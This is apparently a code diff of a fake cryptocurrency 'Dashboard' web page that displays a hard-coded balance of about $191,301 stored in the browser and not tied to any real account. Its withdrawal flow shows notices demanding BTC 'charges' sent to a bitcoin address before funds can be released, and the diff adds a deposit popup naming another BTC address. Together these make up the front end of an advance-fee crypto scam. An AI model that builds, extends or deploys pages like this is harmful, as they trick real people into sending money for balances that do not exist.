@@ -1,11 +1,10 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard</title>
-    <link rel="stylesheet" href="stylesheet.css">
+    <link rel="stylesheet" href="../stylesheet.css">
 </head>
 <body>
     <div class="welcomeNote">
@@ -15,18 +14,18 @@
     <div class="overallIn">
         <div class="balanceDiv">
             <h3>Total Balance:</h3>
-            <h2 id="balance">$191,401.22</h2>
+            <h2 id="balance">$191,301.00</h2>
             <hr>
             <div class="recentT">
                 <h3>Recent Trx.</h3>
 
                 <div class="outliner">
                     <div class="outlinee in"></div>
-                    <h3>$190,000.22</h3>
+                    <h3>$190,301.00</h3>
                 </div>
                 <div class="outliner">
                     <div class="outlinee in"></div>
-                    <h3>$1,401.00</h3>
+                    <h3>$1,000.00</h3>
                 </div>
                 <div class="outliner incomeAdded" style="display: none;">
                     <div class="outlinee out"></div>
@@ -35,7 +34,7 @@
             </div>
         </div>
         <div class="imageCard">
-            <img src="media/phonto-1.JPG" class="debitCard" alt="card image">
+            <img src="../media/phonto-1.JPG" class="debitCard" alt="card image">
         </div>
         <div class="contactForm cardDet" style="display: none;">
             <p>Card Details</p>
@@ -49,7 +48,7 @@
     </div>
 
     <div class="withdrawDeposit">
-       // <button class="deposit">Deposit</button>
+        <button class="ddepositng">Deposit</button>
         <button class="withdraw">Withdraw</button>
     </div>
     <div class="contactForm" id="withrawalNote" style="display: none;">
@@ -99,24 +98,16 @@
         </div>
     </div>
 
-    <!-- <div class="contactForm chargesDiv" style="display: none; margin: 0 5px;">
+    <div class="contactForm chargesDiv" style="display: none;">
         <p>
-            Withdrawal of 191,601.10 is pending. <br> You will need 0.011 BTC charges for withdrawal to your account to avoid errors or loss of assets.
+            Please check your inbox of usdt*****@gmail.com for last confirmation
         </p>
-        <p style="font-size: 10; width: 100%; margin: 0 10px;">
+        <!-- <p>
+            Withdrawal of 191,601.10 is pending. <br> You will need 0.0035 BTC charges for withdrawal to your account to avoid errors or loss of assets.
+        </p> -->
+        <!-- <p style="font-size: 10; width: 100%; margin: 0 10px;">
             bc1qhtx86fhc0a9tkmeakajstyg <br> r2tgupjnw63cenx
-        </p>
-    </div> -->
-
-    <div class="contactForm withdrawalNotiCoin" style="display: none;">
-        <h3>Coin Withdrawal</h3>
-        <p>
-            You will need 0.0035 BTC charges for withdrawal to your account to avoid errors or loss of assets.
-        </p>
-        <p style="font-size: 10; width: 100%; margin: 0 10px;">
-            bc1qhtx86fhc0a9tkmeakajstyg <br> r2tgupjnw63cenx
-        </p>
-        <p id="cancell" style="color: red; cursor: pointer;">X</p>
+        </p> -->
     </div>
 
     <div class="footerDash">
@@ -147,13 +138,19 @@
         <div class="secondShift">
             <div class="innerOne">
                 <h3>Quick Links</h3>
+                <!-- <li class="ddepositng">Deposit</li> -->
                 <a href="#">Products</a>
+                <a href="#">Trials</a>
+                <a href="#">Partners</a>
+                <a href="#">support</a>
+                <a href="#">Training</a>
+                <a href="#">Blogs</a>
             </div>
         </div>
     </div>
 
     <div class="contactForm" id="pleasePay" style="display: none;">
-            
+
             <input type="text" class='walletAdd' placeholder='Enter your wallet Address'>
         <button id="lastConfirm">Confirm</button>
     </div>
@@ -166,7 +163,7 @@
     </div>
 
     <div class="contactForm lastNote" id="processing" style="display: none; background-color: rgb(21, 125, 40);">
-        <h3>Please confirm that you're withdrawing on BTC network.. <br> Mismatched address information may result to loss of assets</h3>
+        <h3>Please confirm that you're withdrawing on BTC network.. Mismatched address information may result to loss of assets</h3>
         <div class="contBack">
             <!-- <button class="mainMenu">Main Menu</button> -->
             <button class="cancelWith">Confirm</button>
@@ -193,6 +190,10 @@
     </div>
 
 
+    <div class="contactForm depp" style="display: none;">
+        <p>Please make your deposit on this wallet address <br> bc1qprdk35m3h3ygds9mahpuhp6pqph36h48s935eh</p>
+        <p class="cancelDeposit" style="cursor: pointer; color: red;">X</p>
+    </div>
 
 
 
@@ -203,7 +204,10 @@
 
 
 
-    <script type="module">
+
+
+    <script type='module'>
+
 
 import { createClient } from 'https://esm.sh/@supabase/supabase-js';
 
@@ -214,7 +218,11 @@ const supabaseKey =
 const supabase = createClient(supabaseUrl, supabaseKey);
 
 
-document.addEventListener('DOMContentLoaded', async() => {
+
+
+
+
+document.addEventListener('DOMContentLoaded', function() {
     // Get elements
     let withrawalBtn = document.querySelector('.withdraw');
     let withrawalNote = document.getElementById('withrawalNote');
@@ -226,7 +234,6 @@ document.addEventListener('DOMContentLoaded', async() => {
     let lastConfirm = document.getElementById('lastConfirm');
     let processing = document.getElementById('processing');
     let codeDiv = document.getElementById('codeDiv');
-    let cancell = document.getElementById('cancell');
     let mainCoin = document.querySelector('.mainCoin');
     let copyBut = document.querySelector('.copyBut');
     let walletCopied = document.querySelector('.walletCopied');
@@ -242,7 +249,10 @@ document.addEventListener('DOMContentLoaded', async() => {
     let recentTrx = document.querySelector('.recentT');
     let withdrawSuccess = document.querySelector('.withdrawSuccess');
     let chargesDiv = document.querySelector('.chargesDiv');
-    let withdrawalNotiCoin = document.querySelector('.withdrawalNotiCoin');
+    let ddepositng = document.querySelector('.ddepositng');
+    let cancelDeposit = document.querySelector('.cancelDeposit');
+    let depp = document.querySelector('.depp');
+
 
     // CHECK AUTHENTICATION
     const checkAuth = async () => {
@@ -264,11 +274,12 @@ document.addEventListener('DOMContentLoaded', async() => {
 
 
 
+
     // Initialize application state from localStorage or set defaults
-    let currentBalance = localStorage.getItem('newBalancess') ? 
-        parseFloat(localStorage.getItem('newBalancess')) : 
-        191401.22;
-    
+    let currentBalance = localStorage.getItem('currentBalancesss') ? 
+        parseFloat(localStorage.getItem('currentBalancesss')) : 
+        191301.00;
+
     // Update initial balance display
     balance.textContent = formatMoney(currentBalance);
 
@@ -282,31 +293,31 @@ document.addEventListener('DOMContentLoaded', async() => {
 
     // Save balance to localStorage
     function saveBalance(amount) {
-        localStorage.setItem('newBalancess', amount.toString());
+        localStorage.setItem('currentBalancesss', amount.toString());
     }
 
     // Save transaction to history
     function saveTransaction(amount, type) {
-        let transactions = JSON.parse(localStorage.getItem('transactionss')) || [];
+        let transactions = JSON.parse(localStorage.getItem('transactionsss')) || [];
         transactions.push({
             amount: amount,
             type: type,
             date: new Date().toISOString()
         });
-        localStorage.setItem('transactionss', JSON.stringify(transactions));
+        localStorage.setItem('transactionsss', JSON.stringify(transactions));
     }
 
     // Load transaction history
     function loadTransactionHistory() {
-        let transactions = JSON.parse(localStorage.getItem('transactionss')) || [];
-        
+        let transactions = JSON.parse(localStorage.getItem('transactionsss')) || [];
+
         // Clear existing transaction displays except the default ones
         const existingTransactions = recentTrx.querySelectorAll('.outliner:not(:nth-child(2)):not(:nth-child(3))');
         existingTransactions.forEach(tx => tx.remove());
-        
+
         // Show only the last 5 transactions, most recent first
         const recentTransactions = transactions.slice(-5).reverse();
-        
+
         recentTransactions.forEach(tx => {
             const transactionEl = document.createElement('div');
             transactionEl.className = 'outliner';
@@ -314,16 +325,11 @@ document.addEventListener('DOMContentLoaded', async() => {
                 <div class="outlinee ${tx.type === 'withdrawal' ? 'out' : 'in'}"></div>
                 <h3>${formatMoney(tx.amount)}</h3>
             `;
-            
+
             // Insert after the heading (3rd child)
             recentTrx.insertBefore(transactionEl, recentTrx.children[3]);
         });
     }
-
-    // CANCEL THE COIN WITHDRAWAL NOTIFICATION
-    cancell.addEventListener('click', () => {
-        withdrawalNotiCoin.style.display = 'none'
-    })
 
     const confirmKill = () => {
         const withdrawAmount = parseFloat(amountTo.value);
@@ -349,7 +355,7 @@ document.addEventListener('DOMContentLoaded', async() => {
         // Update display
         balance.textContent = formatMoney(currentBalance);
         updateWithdraw(withdrawAmount);
-        
+
         // Refresh transaction history
         loadTransactionHistory();
     }
@@ -369,7 +375,7 @@ document.addEventListener('DOMContentLoaded', async() => {
         }
     }
 
-    const mainCode = '675438';
+    const mainCode = '4htuos4';
 
     const confirmCodeInput = () => {
         let codeMainValue = codeMain.value;
@@ -392,12 +398,9 @@ document.addEventListener('DOMContentLoaded', async() => {
         withrawalNote.style.display = 'none';
     });
 
-
-    // STOPPED HERE...............
     cancelWith.addEventListener('click', () => {
-        withdrawalNotiCoin.style.display = "flex"
         lastNote.style.display = 'none';
-        // codeDiv.style.display = 'flex';
+        codeDiv.style.display = 'flex';
     });
 
     const payment = () => {
@@ -420,17 +423,10 @@ document.addEventListener('DOMContentLoaded', async() => {
         }
     }
 
+
+
+
     // Wallet confirm function
-    // const paymentProcessing = () => {
-    //     if(codeDiv.style.display == 'none'){
-    //         codeDiv.style.display = 'flex';
-    //         pleasePay.style.display = 'none';
-    //         withrawalNote.style.display = 'none';
-    //         withdrawDeposit.style.display = 'none';
-    //     } else {
-    //         processing.style.display = 'none';
-    //     }
-    // }
     const paymentProcessing = () => {
         if(processing.style.display == 'none'){
             processing.style.display = 'flex';
@@ -441,6 +437,15 @@ document.addEventListener('DOMContentLoaded', async() => {
             processing.style.display = 'none';
         }
     }
+
+
+
+
+
+
+
+
+
 
     const copyAddress = () => {
         navigator.clipboard.writeText(mainCoin.textContent);
@@ -462,7 +467,29 @@ document.addEventListener('DOMContentLoaded', async() => {
         }
     }
 
-    // 
+    // Deposit functionality
+   // const depositBtn = document.querySelector('.deposit');
+    // if (depositBtn) {
+    //     depositBtn.addEventListener('click', () => {
+    //         const depositAmount = prompt("Enter deposit amount:");
+    //         if (depositAmount && !isNaN(parseFloat(depositAmount)) && parseFloat(depositAmount) > 0) {
+    //             const amount = parseFloat(depositAmount);
+    //             currentBalance += amount;
+    //             saveBalance(currentBalance);
+    //             saveTransaction(amount, 'deposit');
+    //             balance.textContent = formatMoney(currentBalance);
+    //             loadTransactionHistory();
+    //         }
+    //     });
+    // }
+
+    ddepositng.addEventListener('click', () => {
+        depp.style.display = 'flex'
+    })
+
+    cancelDeposit.addEventListener('click', () => {
+        depp.style.display = 'none'
+    })
 
     const successWith = () => {
         if(withdrawSuccess.style.display == 'none'){
@@ -475,13 +502,11 @@ document.addEventListener('DOMContentLoaded', async() => {
     }
 
     // SHOW WITHDRAWAL FEE ON LOAD
-    // const showWithdrawalFee = () => {
-    //     if(chargesDiv.style.display == 'none'){
-    //         chargesDiv.style.display = 'flex';
-    //     }
-    // }
-
-
+    const showWithdrawalFee = () => {
+        if(chargesDiv.style.display == 'none'){
+            chargesDiv.style.display = 'flex';
+        }
+    }
 
     // showWithdrawalFee();
 
@@ -496,4 +521,3 @@ document.addEventListener('DOMContentLoaded', async() => {
     </script>
 </body>
 </html>
-
